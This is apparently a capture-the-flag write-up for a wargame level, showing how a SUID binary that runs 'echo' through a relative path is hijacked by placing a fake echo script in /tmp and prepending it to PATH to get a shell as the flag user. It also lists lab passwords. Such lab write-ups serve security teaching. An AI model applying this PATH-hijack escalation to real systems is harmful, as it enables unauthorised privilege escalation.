# LEVEL 03

> [!TIP]
> user: `level03` <br>
> pass: `kooda2puivaav1idi4f57q8iq`

## STEP 01

In the home folder of the **level03**, the is a **level03** binary that have
SUID bit set, and belong to the **flag03**

Launching the binary with **ltrace**, give us a little more information

```bash
ltrace ./level03
#__libc_start_main(0x80484a4, 1, 0xbffffbe4, 0x8048510, 0x8048580 <unfinished ...>
#getegid()                                                  = 2003
#geteuid()                                                  = 2003
#setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)        = 0
#setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)        = 0
#system("/usr/bin/env echo Exploit me"
```

> [!NOTE]
> what's important here is that the binary launch an system function with an
> no check for relative path for the echo command

## STEP 02

Let's prepare our exploitation

1. First, create a dir in `/tmp` folder
   - `mkdir /tmp/pix && cd /tmp/pix`
1. Now create an **echo** file that will replace the echo command in the binary
    - `echo bash > /tmp/pix/echo && chmod +x /tmp/pix/echo`
1. Setup the **PATH** env variable to make the `/tmp/pix` folder prevent from
   all other
    - `export PATH=${PWD}:${PATH}`
1. From here, in the `/tmp/pix` folder, launch the `/home/user/level03/level03`
   file

TADA, you now have a shell as **flag03**

> [!IMPORTANT]
> the password for the next level is `qi0maab88jeaj46qoumi7maus`
